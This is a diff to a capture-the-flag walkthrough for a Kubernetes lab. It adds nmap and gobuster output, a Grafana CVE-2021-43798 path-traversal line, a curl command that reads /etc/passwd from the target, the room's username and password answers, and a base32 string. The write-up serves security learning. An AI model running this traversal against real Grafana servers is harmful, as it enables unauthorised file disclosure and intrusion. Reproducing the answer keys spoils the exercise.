@@ -22,38 +22,237 @@ Use Nmap to find open ports and gain a foothold by exploiting a vulnerable servi
 
 
 > 1.1. <em>Find the username?</em><br><a id='1.1'></a>
->> <strong><code>______</code></strong><br>
+>> <strong><code>vagrant</code></strong><br>
 <p></p>
 
 
 <br>
 
-> 1.2. <em>Find the username?</em><br><a id='1.2'></a>
->> <strong><code>______</code></strong><br>
+> 1.2. <em>Find the password?</em><br><a id='1.2'></a>
+>> <strong><code>hereiamatctf907</code></strong><br>
 <p></p>
 
 
 <br>
 
-<h3>nmap</h3>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
 
 
 ```bash
-:~/Kubernetes-for-Everyone# nmap -sS -sV -Pn -p- -T4 TargetIP
+:~/Kubernetes-for-Everyone# nmap -sC -sV -T4 -p- TargetIP
 ...
 PORT     STATE SERVICE           VERSION
 22/tcp   open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+...
 111/tcp  open  rpcbind           2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
 3000/tcp open  ppp?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Tue, 27 May 2025 21:19:36 GMT
+|     Content-Length: 29
+|     href="/login">Found</a>.
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Tue, 27 May 2025 21:19:06 GMT
+|     Content-Length: 29
+|     href="/login">Found</a>.
+|   HTTPOptions: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Tue, 27 May 2025 21:19:11 GMT
+|_    Content-Length: 0
 5000/tcp open  http              Werkzeug httpd 2.0.2 (Python 3.8.12)
+|_http-server-header: Werkzeug/2.0.2 Python/3.8.12
+|_http-title: Etch a Sketch
 6443/tcp open  ssl/sun-sr-https?
-2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     Audit-Id: 10e96b0e-2fff-483e-9448-5fab506d384a
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     Date: Tue, 27 May 2025 21:19:37 GMT
+|     Content-Length: 129
+|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     Audit-Id: 393ec30b-9c0a-40be-9586-25b3f82cdbc5
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     Date: Tue, 27 May 2025 21:19:12 GMT
+|     Content-Length: 129
+|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
+|   HTTPOptions: 
+|     HTTP/1.0 401 Unauthorized
+|     Audit-Id: 13a5e863-a6a0-4f37-8708-b1e5424fe7be
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     Date: Tue, 27 May 2025 21:19:12 GMT
+|     Content-Length: 129
+|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
+| ssl-cert: Subject: commonName=kubernetes/organizationName=kubernetes
+| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.svc.cluster.local, DNS:localhost, IP Address:127.0.0.1, IP
+...
 ```
 
+<br>
+
+<h3>Gobuster</h3>
+
+```bash
+:~/Kubernetes-for-Everyone# gobuster dir -u http://TargetIP:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 28034 -t 100 -r -x php,txt,html
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://TargetIP:3000
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          28034
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html
+[+] Follow Redirect:         true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/signup               (Status: 200) [Size: 27985]
+...
+/robots.txt           (Status: 200) [Size: 26]
+/verify               (Status: 200) [Size: 27985]
+/metrics              (Status: 200) [Size: 45373]
+/apis                 (Status: 401) [Size: 32]
+/apis.txt             (Status: 401) [Size: 32]
+/apis.php             (Status: 401) [Size: 32]
+/apis.html            (Status: 401) [Size: 32]
+...
+/apilist.txt          (Status: 401) [Size: 32]
+/apilist.php          (Status: 401) [Size: 32]
+/apilist              (Status: 401) [Size: 32]
+/apilist.html         (Status: 401) [Size: 32]
+
+```
 
 <br>
+
 <br>
+
+<h3>Website</h3>
+<p><code>Grafana</code>:<code>v8.3.0</code></p>
+
+![image](https://github.com/user-attachments/assets/40b58445-501e-4a01-ba8c-4cd00accdad8)
+
+<br>
+
+<h3>ExploitDB</h3>
+<p>CVE-2021-43798</p>
+
+![image](https://github.com/user-attachments/assets/1457482a-11fd-4cd4-afc8-f3e18cd77c86)
+
+<br>
+
+<h3>Pluma</h3>
+
+![image](https://github.com/user-attachments/assets/af434670-731d-4e03-a376-9eb57444b6b9)
+
+<br>
+
+```bash
+url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
+```
+
+<br>
+
+```bash
+curl http://TargetIP:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd --path-as-is
+```
+
+<br>
+
+<p><code>hereiamatctf907</code> might be a password.</p>
+
+![image](https://github.com/user-attachments/assets/8c485fd9-0913-448e-8d4d-b23bb5373afe)
+
+
+<br>
+
+<h3>Website, another</h3>
+
+![image](https://github.com/user-attachments/assets/f4a4d871-635a-4390-aac1-7404a4529ed4)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/25d1d09a-2982-4374-ba8c-804f7dec1f1f)
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/cff733da-b6d3-43de-8b38-0b23b8c7ab6e)
+
+
+
+<br>
+
+<h3>Pastebin</h3>
+
+![image](https://github.com/user-attachments/assets/10dc9cc4-ef3d-43fd-9ed6-aba549b4b9d1)
+
+<br>
+
+<p><code>OZQWO4TBNZ2A====</code></p>
+
+<br>
+
+<h3>CyberChef</h3>
+
+![image](https://github.com/user-attachments/assets/1c2b362e-e256-4998-bf22-8bc144173a7b)
+
 
 
 
